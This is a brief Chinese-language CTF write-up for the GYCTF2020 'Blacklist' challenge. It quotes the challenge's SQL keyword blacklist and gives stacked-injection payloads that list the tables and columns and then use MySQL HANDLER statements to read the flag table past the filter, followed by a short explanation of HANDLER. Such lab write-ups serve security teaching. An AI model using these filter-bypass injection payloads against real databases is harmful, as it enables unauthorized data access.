# \[GYCTF2020]Blacklist

## \[GYCTF2020]Blacklist

## 考点

* 堆叠注入
* MySQL HANDLER 语句

## wp

过滤语句是

return preg\_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i",$inject);

无法使用偷天换日的方法和预编译，但是可以使用 HANDLER 语句

首先，看一下表 1';show tables;#，有两个表 FlagHere 和 words\
然后看一下字段

```
1';show columns from `FlagHere`;#
```

最后利用 HANDLER 语句读取 flag

```
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
```

mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。

通过HANDLER tbl\_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1\_name的句柄。\
通过HANDLER tbl\_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。\
通过HANDLER tbl\_name CLOSE来关闭打开的句柄。

## 小结

1. https://blog.csdn.net/JesseYoung/article/details/40785137
